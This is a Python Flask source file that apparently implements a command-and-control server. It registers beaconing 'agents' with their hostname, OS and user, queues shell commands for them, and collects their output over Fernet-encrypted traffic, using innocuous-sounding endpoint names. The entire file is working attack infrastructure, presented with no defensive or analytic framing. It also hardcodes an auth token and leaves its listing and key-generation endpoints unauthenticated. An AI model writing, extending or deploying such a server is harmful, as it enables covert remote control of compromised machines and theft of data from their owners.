from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import uuid
from datetime import datetime
import json

app = Flask(__name__)

# =========================
# CONFIG
# =========================
AUTH_TOKEN = "supersecretkey"

# Generate once and reuse
FERNET_KEY = b'PASTE_YOUR_FERNET_KEY_HERE'

cipher = Fernet(FERNET_KEY)

# =========================
# Storage
# =========================
agents = {}
tasks = {}
results = []

# =========================
# Helpers
# =========================
def encrypt_payload(data):
    raw = json.dumps(data)
    encrypted = cipher.encrypt(raw.encode())
    return encrypted

def decrypt_payload(raw_data):
    decrypted = cipher.decrypt(raw_data)
    return json.loads(decrypted.decode())

def validate_headers(req):

    auth = req.headers.get("Auth")
    session_id = req.headers.get("X-Session-ID")
    user_agent = req.headers.get("User-Agent")

    if auth != AUTH_TOKEN:
        return False, "Invalid Auth Token"

    if not session_id:
        return False, "Missing Session ID"

    if not user_agent:
        return False, "Missing User-Agent"

    return True, None

# =========================
# Beacon Endpoint
# =========================
@app.route("/status", methods=["POST"])
def beacon():

    valid, error = validate_headers(request)

    if not valid:
        return jsonify({
            "error": error
        }), 403

    try:

        decrypted = decrypt_payload(request.data)

        agent_id = decrypted.get("id")

        # Save agent info
        agents[agent_id] = {
            "hostname": decrypted.get("hostname"),
            "os": decrypted.get("os"),
            "user": decrypted.get("user"),
            "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

        print("\n==============================")
        print(f"[+] Beacon From: {agent_id}")
        print("==============================")
        print(f"Hostname : {decrypted.get('hostname')}")
        print(f"OS       : {decrypted.get('os')}")
        print(f"User     : {decrypted.get('user')}")

        # Send queued task
        if agent_id in tasks and tasks[agent_id]:

            task = tasks[agent_id].pop(0)

            print(f"\n[+] Sending Task -> {task['command']}")

            encrypted_response = encrypt_payload({
                "task": task
            })

            return encrypted_response

        encrypted_response = encrypt_payload({
            "task": None
        })

        return encrypted_response

    except Exception as e:

        return jsonify({
            "error": str(e)
        }), 500

# =========================
# Queue Task
# =========================
@app.route("/upload", methods=["POST"])
def queue_task():

    try:

        valid, error = validate_headers(request)

        if not valid:
            return jsonify({
                "error": error
            }), 403

        decrypted = decrypt_payload(request.data)

        agent_id = decrypted.get("id")
        command = decrypted.get("command")

        if not agent_id or not command:

            return jsonify({
                "error": "Missing ID or command"
            }), 400

        if agent_id not in tasks:
            tasks[agent_id] = []

        task_data = {
            "task_id": str(uuid.uuid4()),
            "command": command,
            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

        tasks[agent_id].append(task_data)

        print("\n==============================")
        print("[+] Task Queued")
        print("==============================")
        print(f"Agent   : {agent_id}")
        print(f"Command : {command}")

        encrypted_response = encrypt_payload({
            "status": "queued",
            "task": task_data
        })

        return encrypted_response

    except Exception as e:

        return jsonify({
            "error": str(e)
        }), 500

# =========================
# Receive Result
# =========================
@app.route("/push", methods=["POST"])
def receive_result():

    try:

        valid, error = validate_headers(request)

        if not valid:
            return jsonify({
                "error": error
            }), 403

        decrypted = decrypt_payload(request.data)

        agent_id = decrypted.get("id")
        output = decrypted.get("output")

        result = {
            "agent": agent_id,
            "output": output,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

        results.append(result)

        print("\n==============================")
        print("[+] Result Received")
        print("==============================")
        print(f"Agent : {agent_id}")
        print(f"Output:\n{output}")

        encrypted_response = encrypt_payload({
            "status": "received"
        })

        return encrypted_response

    except Exception as e:

        return jsonify({
            "error": str(e)
        }), 500

# =========================
# Show Agents
# =========================
@app.route("/agents", methods=["GET"])
def list_agents():

    return jsonify(agents)

# =========================
# Show Results
# =========================
@app.route("/results", methods=["GET"])
def list_results():

    return jsonify(results)

# =========================
# Generate Fernet Key
# =========================
@app.route("/generate_key", methods=["GET"])
def generate_key():

    key = Fernet.generate_key().decode()

    return jsonify({
        "fernet_key": key
    })

# =========================
# Main
# =========================
if __name__ == "__main__":

    print("\n[+] Secure Server Started")
    print("[+] Listening on 0.0.0.0:5000")
    print(f"[+] Fernet Key: {FERNET_KEY.decode()}\n")

    app.run(
        host="0.0.0.0",
        port=5000
    )